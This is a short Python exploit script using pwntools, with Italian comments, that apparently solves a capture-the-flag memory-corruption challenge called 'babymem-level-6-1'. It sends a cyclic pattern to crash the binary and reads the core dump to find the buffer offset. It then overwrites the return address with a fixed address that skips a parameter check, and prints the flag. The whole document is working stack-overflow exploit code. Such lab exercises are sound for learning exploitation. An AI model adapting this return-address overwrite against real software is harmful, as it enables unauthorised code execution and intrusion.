from pwn import *

elf = ELF('/challenge/babymem-level-6-1') # Apro il binario

# Faccio partire il processo disattivando il setuid
# Così facendo quando il processo crasha verrà generato il core dump
io = elf.process(setuid=False) 

# Invio un payload abbastanza grande da sovrascrivere il return address e far crashare il programma
io.sendline("512")
io.sendline(cyclic(512,n=8))
io.wait()

buff_len = cyclic_find(io.corefile.fault_addr,n=8) # Apro il coredump e leggo l'indirizzo che ha fatto crashare il programma e calcolo la lunghezza del buffer

addr = 0x401c85 # Indirizzo della prima istruzione dopo il controllo del parametro (preso da ghidra)

#Creo il payload
PAYLOAD = b'A'*buff_len+\
    p64(addr)

# Faccio ripartire il processo e invio il payload
io.close()
io = elf.process()
print(io.recvuntil("Payload size:"))
io.sendline(f"{len(PAYLOAD)}".encode())
print(io.recvuntil(b'!'))
io.sendline(PAYLOAD)
# Leggo la flag
print(io.recvall().decode())
